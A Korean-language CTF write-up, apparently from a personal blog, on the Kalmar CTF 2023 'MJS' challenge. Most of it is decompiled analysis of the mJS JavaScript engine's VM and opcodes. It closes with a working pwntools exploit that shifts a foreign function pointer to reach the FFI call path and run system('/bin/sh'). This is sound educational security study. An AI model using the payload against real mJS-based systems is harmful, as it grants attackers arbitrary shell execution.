scopes_len\u0026#34;, \u0026#34;src/mjs_exec.c\u0026#34;, 0x3A1u, \u0026#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\u0026#34;); mjsa-\u0026gt;scopes.len = 8 * scopes_len_0; v41 = mjsa; v32 = vtop(\u0026amp;mjsa-\u0026gt;loop_addresses); i = mjs_get_int(v41, v32) - 1; } goto LABEL_93; case 0x22u: if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;call_stack) \u0026gt;= 5 ) { v48 = mjsa; v23 = vptr(\u0026amp;mjsa-\u0026gt;call_stack, -1); retval_pos = mjs_get_int(v48, *v23); v49 = mjs_pop(mjsa); *vptr(\u0026amp;mjsa-\u0026gt;stack, (int)retval_pos - 1) = v49; } else { mjs_set_errorf(mjsa, MJS_INTERNAL_ERROR, \u0026#34;cannot return\u0026#34;); } goto LABEL_93; case 0x23u: i = bp_0.data.len; goto LABEL_93; case 0x24u: bcode_offset = *(_DWORD *)\u0026amp;code[i + 5]; i += bcode_offset; goto LABEL_93; case 0x25u: if ( prev_opcode != 22 ) mjsa-\u0026gt;vals.last_getprop_obj = 0xFFF3000000000000LL; push_mjs_val(\u0026amp;mjsa-\u0026gt;arg_stack, mjsa-\u0026gt;vals.last_getprop_obj); v50 = mjsa; p_arg_stack = \u0026amp;mjsa-\u0026gt;arg_stack; v20 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)mjs_stack_size(\u0026amp;mjsa-\u0026gt;stack), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v21 = mjs_mk_number(v50, _mm_unpackhi_pd(v20, v20).m128d_f64[0] + v20.m128d_f64[0]); push_mjs_val(p_arg_stack, v21); goto LABEL_93; case 0x26u: iterator = vptr(\u0026amp;mjsa-\u0026gt;stack, -1); obj_1 = *vptr(\u0026amp;mjsa-\u0026gt;stack, -2); if ( mjs_is_object(obj_1) ) { name = *vptr(\u0026amp;mjsa-\u0026gt;stack, -3); key_2 = mjs_next(mjsa, obj_1, iterator); if ( key_2 != 0xFFF3000000000000LL ) { scope = mjs_find_scope(mjsa, name); mjs_set_v(mjsa, scope, name, key_2); } } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;can\u0026#39;t iterate over non-object value\u0026#34;); } goto LABEL_93; default: mjs_dump(mjsa, 1); mjs_set_errorf( mjsa, MJS_INTERNAL_ERROR, \u0026#34;Unknown opcode: %d, off %d+%d\u0026#34;, opcode, LODWORD(bp_0.start_idx), (unsigned int)i); i = bp_0.data.len; goto LABEL_93; } } } 이 함수에서 VM이 돌아간다.\n직접 OPCODE를 분석해보기 위해서 gdbscript를 작성했다.\nimport gdb gdb.execute(\u0026#34;start\u0026#34;) res = gdb.execute(\u0026#34;vmmap\u0026#34;,to_string=True) res =res[230:] binbase = int(res[res.find(\u0026#39;0x\u0026#39;) : res.find(\u0026#39;0x\u0026#39;)+8*2+2],16) bp_off = [0x007219] for i in bp_off: gdb.execute(\u0026#34;b * \u0026#34;+hex(binbase + i)) gdb.execute(\u0026#34;c\u0026#34;) opcode = [] l = 8 for i in range(l): rax = int(gdb.parse_and_eval(\u0026#34;$rax\u0026#34;)) opcode.append(rax) gdb.execute(\u0026#34;c\u0026#34;) print(i) print(opcode) OPCODE를 배열을 뽑아볼 수 있었다. [36, 11, 9, 22, 37, 11, 29, 35] 분석을 편하게 하기 위해서 파이썬 스크립트를 작성했다.\nstr_ = \u0026#39;\u0026#39;\u0026#39;enum mjs_opcode { OP_NOP, /* ( -- ) */ OP_DROP, /* ( a -- ) */ OP_DUP, /* ( a -- a a ) */ OP_SWAP, /* ( a b -- b a ) */ OP_JMP, /* ( -- ) */ OP_JMP_TRUE, /* ( -- ) */ OP_JMP_NEUTRAL_TRUE, /* ( -- ) */ OP_JMP_FALSE, /* ( -- ) */ OP_JMP_NEUTRAL_FALSE, /* ( -- ) */ OP_FIND_SCOPE, /* ( a -- a b ) */ OP_PUSH_SCOPE, /* ( -- a ) */ OP_PUSH_STR, /* ( -- a ) */ OP_PUSH_TRUE, /* ( -- a ) */ OP_PUSH_FALSE, /* ( -- a ) */ OP_PUSH_INT, /* ( -- a ) */ OP_PUSH_DBL, /* ( -- a ) */ OP_PUSH_NULL, /* ( -- a ) */ OP_PUSH_UNDEF, /* ( -- a ) */ OP_PUSH_OBJ, /* ( -- a ) */ OP_PUSH_ARRAY, /* ( -- a ) */ OP_PUSH_FUNC, /* ( -- a ) */ OP_PUSH_THIS, /* ( -- a ) */ OP_GET, /* ( key obj -- obj[key] ) */ OP_CREATE, /* ( key obj -- ) */ OP_EXPR, /* ( ... -- a ) */ OP_APPEND, /* ( a b -- ) */ OP_SET_ARG, /* ( a -- a ) */ OP_NEW_SCOPE, /* ( -- ) */ OP_DEL_SCOPE, /* ( -- ) */ OP_CALL, /* ( func param1 param2 ... num_params -- result ) */ OP_RETURN, /* ( -- ) */ OP_LOOP, /* ( -- ) Push break \u0026amp; continue addresses to loop_labels */ OP_BREAK, /* ( -- ) */ OP_CONTINUE, /* ( -- ) */ OP_SETRETVAL, /* ( a -- ) */ OP_EXIT, /* ( -- ) */ OP_BCODE_HEADER, /* ( -- ) */ OP_ARGS, /* ( -- ) Mark the beginning of function call arguments */ OP_FOR_IN_NEXT, /* ( name obj iter_ptr -- name obj iter_ptr_next ) */ OP_MAX\u0026#39;\u0026#39;\u0026#39;.replace(\u0026#39; \u0026#39;,\u0026#39;\u0026#39;) str_ = (str_.split(\u0026#39;,\u0026#39;)) OPCODE = [36, 11, 9, 22, 37, 11, 29, 35] # OPCODE =[36, 11, 9, 22, 35] # OPCODE = [36, 11, 10, 23, 11, 9, 11, 9, 22, 24] for op in OPCODE: k=0 for i in str_: if op == k: print(i[i.find(\u0026#34;OP_\u0026#34;):] + \u0026#39; = \u0026#39;+ hex(k)) k+=1 root@ed1ff428eb33 ~/Desktop/Kalmar/MJS - KalmarCTF ❯ python3 print_opcode.py OP_BCODE_HEADER = 0x24 OP_PUSH_STR = 0xb OP_FIND_SCOPE = 0x9 OP_GET = 0x16 OP_ARGS = 0x25 OP_PUSH_STR = 0xb OP_CALL = 0x1d OP_EXIT = 0x23 case 0xBu: length = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_4); v55 = mjsa; v16 = mjs_mk_string(mjsa, (const char *)\u0026amp;code[i + 1 + llen_4], length, 1); mjs_push(v55, v16); i += length + llen_4; goto LABEL_93; OP_PUSH_STR은 그냥 문자열을 약간의 가공을 해서 스택에 push하는 명령이다.\n0xfff700746e697270 뒤에는 그냥 아스키고 앞에 0xfff7을 추가해준다. 길이에 따라 로직이 다르지만, print 문자열에 한에서는 위 값이 push된다.\nvoid __cdecl mjs_push(mjs *mjs, mjs_val_t v) { push_mjs_val(\u0026amp;mjs-\u0026gt;stack, v); } void __cdecl push_mjs_val(mbuf *m, mjs_val_t v) { mjs_val_t va; // [rsp+0h] [rbp-10h] BYREF mbuf *ma; // [rsp+8h] [rbp-8h] ma = m; va = v; mbuf_append(m, \u0026amp;va, 8uLL); } size_t __cdecl mbuf_append(mbuf *a, const void *buf, size_t len) { return mbuf_insert(a, a-\u0026gt;len, buf, len); } OP_FIND_SCOPE는 현재 스코프를 찾는 명령이다. OP_CREATE 같은 명령을 수행할때, SCOPE에 값이 추가된다.\n0xfff1561eb4251558 vm stack에 push 되는 값은 위와 같은 주소값이다. 0xfff1이 마스크? 이고 하위 6바이트가 주소로 쓰인다.\nint __cdecl mjs_is_object(mjs_val_t v) { bool v2; // [rsp+1h] [rbp-9h] v2 = 1; if ( (v \u0026amp; 0xFFFF000000000000LL) != 0xFFF1000000000000LL ) return (v \u0026amp; 0xFFFF000000000000LL) == 0xFFFC000000000000LL; return v2; } mjs_is_object 함수가 비교하는 것을 보면, 오브젝트임을 알 수 있다.\nint mjs_is_object(mjs_val_t v) { return (v \u0026amp; MJS_TAG_MASK) == MJS_TAG_OBJECT || (v \u0026amp; MJS_TAG_MASK) == MJS_TAG_ARRAY; } OP_GET은 함수의 주소를 찾을때 사용하는 명령어이다.\ncase 0x16u: obj_0 = mjs_pop(mjsa); // SCOPE key_1 = mjs_pop(mjsa); // ENCODED STR val_0 = 0xFFF3000000000000LL; if ( !getprop_builtin(mjsa, obj_0, key_1, \u0026amp;val_0) )// NOT PROPERTY BUILTIN { if ( mjs_is_object(obj_0) ) val_0 = mjs_get_v_proto(mjsa, obj_0, key_1);// OBJECT -\u0026gt; GET PROTO else mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;type error\u0026#34;); } mjs_push(mjsa, val_0); if ( prev_opcode == 9 ) mjsa-\u0026gt;vals.last_getprop_obj = 0xFFF3000000000000LL; else mjsa-\u0026gt;vals.last_getprop_obj = obj_0; goto LABEL_93; 그 scope의 object에서 key값으로 값을 찾아서 proto?를 얻어서 vm stack에 push한다.\nOP_ARGS는 그냥 인자를 맞춰주는 부분이다. 분석은 안했다.\nOP_CALL은 함수를 호출해준다.\ncase 0x1Du: retval_stack_idx = vtop(\u0026amp;mjsa-\u0026gt;arg_stack); func_pos = mjs_get_int(mjsa, retval_stack_idx) - 1; func = vptr(\u0026amp;mjsa-\u0026gt;stack, func_pos); // get pointer mjs_pop_val(\u0026amp;mjsa-\u0026gt;arg_stack); if ( mjs_is_function(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); off_call = mjs_get_func_addr(*func) - 1; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_call); code = (const uint8_t *)bp_0.data.p; i = off_call - bp_0.start_idx; *func = 0xFFF3000000000000LL; } else if ( mjs_is_ffi_sig(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); mjs_ffi_call2(mjsa); call_stack_restore_frame(mjsa); } else if ( mjs_is_foreign(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); ptr = (void (__fastcall *)(mjs *))mjs_get_ptr(mjsa, *func); ptr(mjsa); call_stack_restore_frame(mjsa); } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;calling non-callable\u0026#34;); } goto LABEL_93; mjs_print는 foreign이다.\nint __cdecl mjs_is_foreign(mjs_val_t v) { return (v \u0026amp; 0xFFFF000000000000LL) == 0xFFF2000000000000LL; } OP_GET에서 가져온 함수의 주소의 마스크가 0xfff2이기 때문이다.\nvoid *__cdecl mjs_get_ptr(mjs *mjs, mjs_val_t v) { if ( mjs_is_foreign(v) ) return get_ptr(v); else return 0LL; } void *__cdecl get_ptr(mjs_val_t v) { return (void *)(v \u0026amp; 0xFFFFFFFFFFFFLL); } 실제로 ptr을 가져올때 마스크는 빼고 본다. 즉 실제 주소를 가져와서 그냥 호출한다.\nOP_EXPR은 어떤 변수에 저장할때 있었던 OPCODE이다. OP_EXPR도 한번 살펴보면, 다음과 같다.\ncase 0x18u: op = code[i + 1]; exec_expr(mjsa, op); ++i; void __cdecl exec_expr(mjs *mjs, int op) { mjs_val_t v2; // rax mjs_val_t v3; // rax mjs_val_t v4; // rax int is_truthy; // eax mjs_val_t v6; // rax mjs_val_t v7; // rax mjs_val_t v8; // rax int v9; // eax mjs_val_t v10; // rax int v11; // eax mjs_val_t v12; // rax mjs_val_t v13; // rax mjs_val_t v14; // rax mjs_val_t v15; // rax mjs_val_t v16; // rax mjs_val_t v17; // rax mjs_val_t v18; // rax mjs_val_t v19; // rax mjs_val_t v20; // rax mjs_val_t v21; // rax mjs_val_t v22; // rax mjs_val_t v23; // rax mjs_val_t v24; // rax mjs_val_t v25; // rax mjs_val_t v26; // rax mjs_val_t v27; // rax mjs_val_t v28; // rax mjs_val_t v29; // rax const char *v30; // rax mjs_val_t v31; // rax mjs_val_t v32; // [rsp+18h] [rbp-228h] mjs_val_t v; // [rsp+28h] [rbp-218h] mjs_val_t v34; // [rsp+38h] [rbp-208h] mjs_val_t v35; // [rsp+48h] [rbp-1F8h] mjs_val_t v_2; // [rsp+110h] [rbp-130h] mjs_val_t key_3; // [rsp+118h] [rbp-128h] mjs_val_t obj_3; // [rsp+120h] [rbp-120h] mjs_val_t v_1; // [rsp+128h] [rbp-118h] mjs_val_t key_2; // [rsp+130h] [rbp-110h] mjs_val_t obj_2; // [rsp+138h] [rbp-108h] mjs_val_t v1_0; // [rsp+140h] [rbp-100h] mjs_val_t key_1; // [rsp+150h] [rbp-F0h] mjs_val_t obj_1; // [rsp+158h] [rbp-E8h] mjs_val_t v1; // [rsp+160h] [rbp-E0h] mjs_val_t key_0; // [rsp+170h] [rbp-D0h] mjs_val_t obj_0; // [rsp+178h] [rbp-C8h] unsigned int ival; // [rsp+188h] [rbp-B8h] int ikey; // [rsp+18Ch] [rbp-B4h] mjs_val_t key; // [rsp+190h] [rbp-B0h] mjs_val_t obj; // [rsp+198h] [rbp-A8h] mjs_val_t val_0; // [rsp+1A0h] [rbp-A0h] double a_7; // [rsp+1A8h] [rbp-98h] double b_5; // [rsp+1B0h] [rbp-90h] double a_6; // [rsp+1B8h] [rbp-88h] double b_4; // [rsp+1C0h] [rbp-80h] double a_5; // [rsp+1C8h] [rbp-78h] double b_3; // [rsp+1D0h] [rbp-70h] double a_4; // [rsp+1D8h] [rbp-68h] double b_2; // [rsp+1E0h] [rbp-60h] mjs_val_t b_1; // [rsp+1E8h] [rbp-58h] mjs_val_t a_3; // [rsp+1F0h] [rbp-50h] mjs_val_t b_0; // [rsp+1F8h] [rbp-48h] mjs_val_t a_2; // [rsp+200h] [rbp-40h] double a_1; // [rsp+208h] [rbp-38h] mjs_val_t val; // [rsp+210h] [rbp-30h] double a_0; // [rsp+218h] [rbp-28h] mjs_val_t a; // [rsp+220h] [rbp-20h] mjs_val_t b; // [rsp+228h] [rbp-18h] switch ( op ) { case 4: case 20: case 50: return; case 5: val_0 = mjs_pop(mjs); // function PTR -foreign obj = mjs_pop(mjs); // scope? key = mjs_pop(mjs); // key name str if ( mjs_is_object(obj) ) { mjs_set_v(mjs, obj, key, val_0); // set foreign ptr RAW } else if ( mjs_is_foreign(obj) ) { ikey = mjs_get_int(mjs, key); ival = mjs_get_int(mjs, val_0); if ( !mjs_is_number(key) ) { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;index must be a number\u0026#34;); mjs_push(mjs, 0xFFF3000000000000LL); return; } if ( mjs_is_number(val_0) \u0026amp;\u0026amp; ival \u0026lt; 0x100 ) { *((_BYTE *)mjs_get_ptr(mjs, obj) + ikey) = ival; } else { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;only number 0 .. 255 can be assigned\u0026#34;); val_0 = 0xFFF3000000000000LL; } } else { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;unsupported object type\u0026#34;); } mjs_push(mjs, val_0); return; case 12: case 13: case 14: case 15: case 16: case 17: case 18: case 19: case 26: case 27: case 48: b = mjs_pop(mjs); a = mjs_pop(mjs); v2 = do_op(mjs, a, b, op); mjs_push(mjs, v2); return; case 22: val = mjs_pop(mjs); is_truthy = mjs_is_truthy(mjs, val); v6 = mjs_mk_boolean(mjs, is_truthy == 0); mjs_push(mjs, v6); return; case 23: v7 = mjs_pop(mjs); a_1 = mjs_get_double(mjs, v7); v8 = mjs_mk_number(mjs, (double)~(int)a_1); mjs_push(mjs, v8); return; case 24: v13 = mjs_pop(mjs); b_2 = mjs_get_double(mjs, v13); v14 = mjs_pop(mjs); a_4 = mjs_get_double(mjs, v14); v15 = mjs_mk_boolean(mjs, b_2 \u0026gt; a_4); mjs_push(mjs, v15); return; case 25: v16 = mjs_pop(mjs); b_3 = mjs_get_double(mjs, v16); v17 = mjs_pop(mjs); a_5 = mjs_get_double(mjs, v17); v18 = mjs_mk_boolean(mjs, a_5 \u0026gt; b_3); mjs_push(mjs, v18); return; case 28: obj_2 = mjs_pop(mjs); key_2 = mjs_pop(mjs); if ( !mjs_is_object(obj_2) || !mjs_is_string(key_2) ) goto LABEL_32; v = mjs_get_v(mjs, obj_2, key_2); v27 = mjs_mk_number(mjs, 1.0); v_1 = do_op(mjs, v, v27, 14); mjs_set_v(mjs, obj_2, key_2, v_1); mjs_push(mjs, v_1); return; case 29: obj_3 = mjs_pop(mjs); key_3 = mjs_pop(mjs); if ( !mjs_is_object(obj_3) || !mjs_is_string(key_3) ) goto LABEL_28; v32 = mjs_get_v(mjs, obj_3, key_3); v28 = mjs_mk_number(mjs, 1.0); v_2 = do_op(mjs, v32, v28, 13); mjs_set_v(mjs, obj_3, key_3, v_2); mjs_push(mjs, v_2); return; case 30: op_assign(mjs, 13); return; case 31: op_assign(mjs, 14); return; case 32: op_assign(mjs, 12); return; case 33: op_assign(mjs, 15); return; case 34: op_assign(mjs, 17); return; case 35: op_assign(mjs, 18); return; case 36: op_assign(mjs, 16); return; case 37: op_assign(mjs, 19); return; case 38: mjs_set_errorf(mjs, MJS_NOT_IMPLEMENTED_ERROR, \u0026#34;Use ===, not ==\u0026#34;); return; case 39: mjs_set_errorf(mjs, MJS_NOT_IMPLEMENTED_ERROR, \u0026#34;Use !==, not !=\u0026#34;); return; case 40: v19 = mjs_pop(mjs); b_4 = mjs_get_double(mjs, v19); v20 = mjs_pop(mjs); a_6 = mjs_get_double(mjs, v20); v21 = mjs_mk_boolean(mjs, b_4 \u0026gt;= a_6); mjs_push(mjs, v21); return; case 41: v22 = mjs_pop(mjs); b_5 = mjs_get_double(mjs, v22); v23 = mjs_pop(mjs); a_7 = mjs_get_double(mjs, v23); v24 = mjs_mk_boolean(mjs, a_7 \u0026gt;= b_5); mjs_push(mjs, v24); return; case 44: a_2 = mjs_pop(mjs); b_0 = mjs_pop(mjs); v9 = check_equal(mjs, a_2, b_0); v10 = mjs_mk_boolean(mjs, v9); mjs_push(mjs, v10); return; case 45: a_3 = mjs_pop(mjs); b_1 = mjs_pop(mjs); v11 = check_equal(mjs, a_3, b_1); v12 = mjs_mk_boolean(mjs, v11 == 0); mjs_push(mjs, v12); return; case 46: op_assign(mjs, 26); return; case 47: op_assign(mjs, 27); return; case 49: op_assign(mjs, 48); return; case 51: v3 = mjs_pop(mjs); a_0 = mjs_get_double(mjs, v3); v4 = mjs_mk_number(mjs, COERCE_DOUBLE(*(_QWORD *)\u0026amp;a_0 ^ 0x8000000000000000LL)); mjs_push(mjs, v4); return; case 52: obj_0 = mjs_pop(mjs); key_0 = mjs_pop(mjs); if ( mjs_is_object(obj_0) \u0026amp;\u0026amp; mjs_is_string(key_0) ) { v35 = mjs_get_v(mjs, obj_0, key_0); v25 = mjs_mk_number(mjs, 1.0); v1 = do_op(mjs, v35, v25, 13); mjs_set_v(mjs, obj_0, key_0, v1); mjs_push(mjs, v35); } else { LABEL_28: mjs_set_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;invalid operand for ++\u0026#34;); } return; case 53: obj_1 = mjs_pop(mjs); key_1 = mjs_pop(mjs); if ( mjs_is_object(obj_1) \u0026amp;\u0026amp; mjs_is_string(key_1) ) { v34 = mjs_get_v(mjs, obj_1, key_1); v26 = mjs_mk_number(mjs, 1.0); v1_0 = do_op(mjs, v34, v26, 14); mjs_set_v(mjs, obj_1, key_1, v1_0); mjs_push(mjs, v34); } else { LABEL_32: mjs_set_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;invalid operand for --\u0026#34;); } return; case 227: v29 = mjs_pop(mjs); v30 = mjs_typeof(v29); v31 = mjs_mk_string(mjs, v30, 0xFFFFFFFFFFFFFFFFLL, 1); mjs_push(mjs, v31); return; default: if ( cs_log_print_prefix(LL_ERROR, \u0026#34;src/mjs_exec.c\u0026#34;, 431) ) cs_log_printf(\u0026#34;Unknown expr: %d\u0026#34;, (unsigned int)op); return; } } scope의 변수에 넣어주는 기능도 수행한다. 나머진 제대로 분석안했다.\nExploitation 파싱할때 ()를 통해서 함수를 호출하는 바이트 코드를 점화할 수 있다. exec_expr에서 함수 포인터가 위에 마스크를 달고 raw 하게 저장됨을 알 수 있다. 사실 아주 당연한 내용이지만, js 엔진 건드려본적이 없어서 잘 몰랐다.\ncase 5: val_0 = mjs_pop(mjs); // function PTR -foreign obj = mjs_pop(mjs); // scope? key = mjs_pop(mjs); // key name str if ( mjs_is_object(obj) ) { mjs_set_v(mjs, obj, key, val_0); // set foreign ptr RAW } mjs_err_t __cdecl mjs_set_v(mjs *mjs, mjs_val_t obj, mjs_val_t name, mjs_val_t val) { return mjs_set_internal(mjs, obj, name, 0LL, 0LL, val); } mjs_err_t __cdecl mjs_set_internal( mjs *mjs, mjs_val_t obj, mjs_val_t name_v, char *name, size_t name_len, mjs_val_t val) { mjs_object *o; // [rsp+8h] [rbp-58h] int need_free; // [rsp+14h] [rbp-4Ch] BYREF mjs_property *p; // [rsp+18h] [rbp-48h] mjs_err_t rcode; // [rsp+24h] [rbp-3Ch] mjs_val_t vala; // [rsp+28h] [rbp-38h] size_t name_lena; // [rsp+30h] [rbp-30h] BYREF char *namea; // [rsp+38h] [rbp-28h] BYREF mjs_val_t name_va; // [rsp+40h] [rbp-20h] BYREF mjs_val_t obja; // [rsp+48h] [rbp-18h] mjs *mjsa; // [rsp+50h] [rbp-10h] mjsa = mjs; obja = obj; name_va = name_v; namea = name; name_lena = name_len; vala = val; rcode = MJS_OK; need_free = 0; if ( name ) { name_va = 0xFFF3000000000000LL; } else { rcode = mjs_to_string(mjsa, \u0026amp;name_va, \u0026amp;namea, \u0026amp;name_lena, \u0026amp;need_free); if ( rcode ) goto clean; } p = mjs_get_own_property(mjsa, obja, namea, name_lena); if ( !p ) { if ( !mjs_is_object(obja) ) return 2; if ( !mjs_is_string(name_va) ) name_va = mjs_mk_string(mjsa, namea, name_lena, 1); p = mjs_mk_property(mjsa, name_va, vala); o = get_object_struct(obja); p-\u0026gt;next = o-\u0026gt;properties; o-\u0026gt;properties = p; } p-\u0026gt;value = vala; clean: if ( need_free ) { free(namea); namea = 0LL; } return rcode; } mjs_property *__cdecl mjs_mk_property(mjs *mjs, mjs_val_t name, mjs_val_t value) { mjs_property *result; // rax result = new_property(mjs); result-\u0026gt;next = 0LL; result-\u0026gt;name = name; result-\u0026gt;value = value; return result; } value가 그대로 저장된다. 이걸로 scope에 foreign 함수 포인터를 raw하게 저장시킬 수 있다. 이제 여기서 함수 포인터에 대한 연산을 수행할 수 있다. do_op 함수의 일부 코드를 보면 왜 가능한지 알 수 있다.\n} else if (mjs_is_foreign(a) || mjs_is_foreign(b)) { /* * When one of the operands is a pointer, only + and - are supported, * and the result is a pointer. */ if (op != TOK_MINUS \u0026amp;\u0026amp; op != TOK_PLUS) { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;invalid operands\u0026#34;); } is_result_ptr = 1; 하나만 foreign pointer를 주고 그냥 상수를 더하면 된다.\n► 0x5647fc468aec \u0026lt;exec_expr+124\u0026gt; call do_op \u0026lt;do_op\u0026gt; rdi: 0x5647fe14f2a0 ◂— 0x0 rsi: 0xfff25647fc465660 rdx: 0x403e000000000000 rcx: 0xd 실제로 연산이 될때 raw 하게 들어가는 것을 볼 수 있다. do_op에서는 do_arith_op을 호출한다.\nstatic double do_arith_op(double da, double db, int op, bool *resnan) { *resnan = false; if (isnan(da) || isnan(db)) { *resnan = true; return 0; } /* clang-format off */ switch (op) { case TOK_MINUS: return da - db; case TOK_PLUS: return da + db; case TOK_MUL: return da * db; case TOK_DIV: if (db != 0) { return da / db; } else { /* TODO(dfrank): add support for Infinity and return it here */ *resnan = true; return 0; } case TOK_REM: /* * TODO(dfrank): probably support remainder operation as it is in JS * (which works with non-integer divisor). */ db = (int) db; if (db != 0) { bool neg = false; if (da \u0026lt; 0) { neg = true; da = -da; } if (db \u0026lt; 0) { db = -db; } da = (double) ((int64_t) da % (int64_t) db); if (neg) { da = -da; } return da; } else { *resnan = true; return 0; } case TOK_AND: return (double) ((int64_t) da \u0026amp; (int64_t) db); case TOK_OR: return (double) ((int64_t) da | (int64_t) db); case TOK_XOR: return (double) ((int64_t) da ^ (int64_t) db); case TOK_LSHIFT: return (double) ((int64_t) da \u0026lt;\u0026lt; (int64_t) db); case TOK_RSHIFT: return (double) ((int64_t) da \u0026gt;\u0026gt; (int64_t) db); case TOK_URSHIFT: return (double) ((uint32_t) da \u0026gt;\u0026gt; (uint32_t) db); } /* clang-format on */ *resnan = true; return 0; } 그대로 연산이 되는데 상위 2바이트를 침범하면, type confusion?도 가능할 것 같다. 어쨌든 여기서 foreign pointer와 연산이 되면, 다른 함수를 호출할 수 있다.\n상위 2바이트만 안건들면 그대로 연산이 되고 0xfff2가 남아서 foreign pointer로 인식되고 OP_CALL로 함수 포인터를 호출할 수 있다. SCOPE에 그대로 저장되기 때문에 그냥 호출하면 된다.\npatch.diff에서 ffi 등록하는 코드를 지웠지만, ffi의 코드는 남아있기 때문에 ffi로 점프하면 된다.\nmjs_err_t __cdecl mjs_ffi_call(mjs *mjs) mjs_ffi_call로 점프해주면 된다.\nmjs_ffi_ctype_t __cdecl parse_cval_type(mjs *mjs, const char *s, const char *e) { bool v4; // [rsp+Eh] [rbp-32h] bool v5; // [rsp+Fh] [rbp-31h] mg_str ms; // [rsp+10h] [rbp-30h] BYREF const char *ea; // [rsp+20h] [rbp-20h] const char *sa; // [rsp+28h] [rbp-18h] mjs *mjsa; // [rsp+30h] [rbp-10h] mjsa = mjs; sa = s; ea = e; memset(\u0026amp;ms, 0, sizeof(ms)); while ( 1 ) { v5 = 0; if ( sa \u0026lt; ea ) v5 = ((*__ctype_b_loc())[*sa] \u0026amp; 0x2000) != 0; if ( !v5 ) break; ++sa; } while ( 1 ) { v4 = 0; if ( ea \u0026gt; sa ) v4 = ((*__ctype_b_loc())[*(ea - 1)] \u0026amp; 0x2000) != 0; if ( !v4 ) break; --ea; } ms.p = sa; ms.len = ea - sa; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;void\u0026#34;) ) return 0; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;userdata\u0026#34;) ) return 1; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;int\u0026#34;) ) return 3; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;bool\u0026#34;) ) return 4; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;double\u0026#34;) ) return 5; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;float\u0026#34;) ) return 6; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;char*\u0026#34;) || !mg_vcmp(\u0026amp;ms, \u0026#34;char *\u0026#34;) ) return 7; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;void*\u0026#34;) || !mg_vcmp(\u0026amp;ms, \u0026#34;void *\u0026#34;) ) return 8; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;struct mg_str\u0026#34;) ) return 10; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;struct mg_str *\u0026#34;) || !mg_vcmp(\u0026amp;ms, \u0026#34;struct mg_str*\u0026#34;) ) return 9; mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;failed to parse val type \\\u0026#34;%.*s\\\u0026#34;\u0026#34;, LODWORD(ms.len), ms.p); return 11; } 이거 보고 잘 맞춰서 세팅해준다음에, system /bin/sh를 호출하면 된다. offset 잘 계산하면 system 주소를 넣어줄 수 있다.\nExploit script 익스플로잇이 되게 화가 난다.\nfrom pwn import * off = 0x6ab0 payload = \u0026#39;let a = print;a+=0x6ab0;a(\u0026#34;int system(char*)\u0026#34;)(\u0026#34;/bin/sh\u0026#34;)\u0026#39; p = process([\u0026#34;./mjs\u0026#34;,\u0026#34;-e\u0026#34;,payload]) p.interactive() ","permalink":"https://msh1307.kr/blog/kalmar_ctf_2023_mjs/","summary":"MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.\nAnalysis FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo \u0026#34;kalmar{redacted}\u0026#34; \u0026gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 \u0026#34;timeout 60 ./remote.py\u0026#34; 22.04이다.\ndiff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile +++ b/Makefile @@ -5,6 +5,7 @@ BUILD_DIR = build RD ?","title":"Kalmar CTF 2023 - MJS"},{"content":"Kernel module? 모듈은 사용자의 혹은 커널의 요구로 읽혀지거나 아니면 없어지는 코드들로 이루어진 프로그램의 어떤 한 조각을 의미한다. 커널은 하나의 큰 모듈들의 집합이라고 볼 수 있다. 모듈들을 통해서 필요할때 더 추가, 혹은 제거를 통해서 커널을 재컴파일 혹은 재가동하지 않고도 커널의 기능을 확장하거나 축소시킬 수 있다.\nlsmod insmod rmmod lsmod를 통해서 현재 커널에 있는 모듈들의 정보를 확인할 수 있다. 이때 lsmod는 /proc/modules를 읽고나서 좀 더 예쁘게 바꿔준다. insmod를 통해서 커널에 모듈을 적재할 수 있다. rmmod를 통해서 커널에 적재된 모듈을 제거할 수 있다. Hello World /* * hello-1.c - The simplest kernel module. */ #include \u0026lt;linux/module.h\u0026gt; /* Needed by all modules */ #include \u0026lt;linux/kernel.h\u0026gt; /* Needed for KERN_INFO */ int init_module(void) { printk(KERN_INFO \u0026#34;Hello world 1.\\n\u0026#34;); /* * A non 0 return means init_module failed; module can\u0026#39;t be loaded. */ return 0; } void cleanup_module(void) { printk(KERN_INFO \u0026#34;Goodbye world 1.\\n\u0026#34;); } 커널 모듈은 최소 두가지 함수를 갖추고 있어야 한다. 하나는 init_module()이고 또 하나는 cleanup_module()이다. init_module은 insmod를 통해서 커널에 